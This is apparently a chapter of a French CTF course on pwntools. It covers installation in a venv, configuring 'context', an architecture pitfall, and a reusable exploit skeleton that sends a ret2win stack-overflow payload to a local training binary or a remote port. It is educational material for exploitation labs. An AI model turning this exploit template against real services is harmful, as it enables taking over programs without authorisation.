# 01 — Installation et contexte

[← Module](README.md)

## Objectif

Installer pwntools dans un environnement isolé, comprendre ce que règle `context`, et écrire le
squelette d'exploit que tous les chapitres suivants réutilisent.

## Installation

pwntools s'installe dans un venv : il tire beaucoup de dépendances (pyelftools, capstone, ropper,
requests), et on ne veut pas polluer l'interpréteur système.

```bash
python3 -m venv ~/.venvs/pwn
source ~/.venvs/pwn/bin/activate
pip install pwntools
pwn version
```

```text
[*] Pwntools v4.15.1
```

`pwn` est la ligne de commande fournie avec la bibliothèque. `pwn checksec`, `pwn cyclic`,
`pwn shellcraft` et `pwn asm` s'utilisent sans écrire une ligne de Python : c'est le moyen le plus
rapide de répondre à une question ponctuelle pendant un CTF.

## Le module `context`

`context` est un objet global qui décrit la cible. Tout ce que pwntools génère — assembleur,
shellcode, largeur des `p64` — en dépend. Mal réglé, il produit des payloads faux **sans lever
d'erreur**.

```python
from pwn import *

context.arch = "amd64"       # architecture de la cible
context.os = "linux"         # système
context.log_level = "error"  # silence : on ne veut que nos print()
```

Le réglage le plus important est `context.binary`. Il lit l'ELF et en déduit architecture, OS et
endianness d'un coup :

```python
context.binary = elf = ELF("./ret2win")
print(context.arch, context.bits, context.endian)
```

```text
amd64 64 little
```

## Le piège du contexte par défaut

Par défaut, `context.arch` vaut `i386`, même sur une machine x86-64. Voici l'erreur que cela
produit, telle qu'elle est apparue pendant la préparation de ce module :

```python
from pwn import *
context.log_level = "error"
print(hex(next(e.search(asm("pop rdi; ret")))))
```

```text
[ERROR] Shellcode contains relocations:
    Relocation section '.rel.shellcode' at offset 0x8c contains 1 entry:
     Offset     Info    Type            Sym.Value  Sym. Name
    00000002  00000301 R_386_32          00000000   rdi
```

Le message parle de `R_386_32` : l'assembleur a compilé pour du 32 bits, où `rdi` n'existe pas.
Deux corrections possibles, la seconde étant préférable :

```python
asm("pop rdi; ret", arch="amd64")     # ponctuel
context.binary = elf                  # global, déduit du binaire
```

## Le squelette d'exploit

Tous les chapitres partent de cette structure. Elle sépare ce qui change (les constantes de la
cible) de ce qui ne change pas (le dialogue).

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./ret2win", checksec=False)
context.log_level = "error"

HOST, PORT = "127.0.0.1", 1337
OFFSET = 72


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def exploit():
    io = start()
    payload = b"A" * OFFSET + p64(elf.symbols["win"])
    io.sendlineafter(b"Entree :\n", payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
```

`args.REMOTE` est une commodité de pwntools : `python3 exploit.py REMOTE` bascule sur la cible
distante sans modifier le script. C'est ce qui rend un exploit de CTF réutilisable d'un coup à
l'autre.

## Sortie d'un premier essai

```bash
python3 exploit.py
```

```text
Entree :
Bravo, tu as detourne l'execution !
```

L'exploit du chapitre 06 est déjà complet ici ; les chapitres suivants détaillent chaque pièce.

## Pièges

| Symptôme | Cause probable |
| --- | --- |
| `Relocation section ... R_386_32` | `context.arch` resté à `i386` |
| Payload tronqué à l'envoi | `send` sans `sendline`, ou cible qui lit avec `fgets` |
| Aucune sortie alors que le script tourne | `context.log_level = "error"` masque aussi les erreurs réseau |
| `ImportError: No module named pwn` | venv non activé, ou `pip install` fait avec un autre Python |

## À retenir

- Un venv par outil, jamais d'installation globale.
- `context.binary` remplace trois réglages manuels et évite les erreurs d'architecture.
- `pwn checksec`, `pwn cyclic`, `pwn asm` répondent vite, sans script.
- Le squelette `start()` / `exploit()` avec `args.REMOTE` sert pour tout le module.
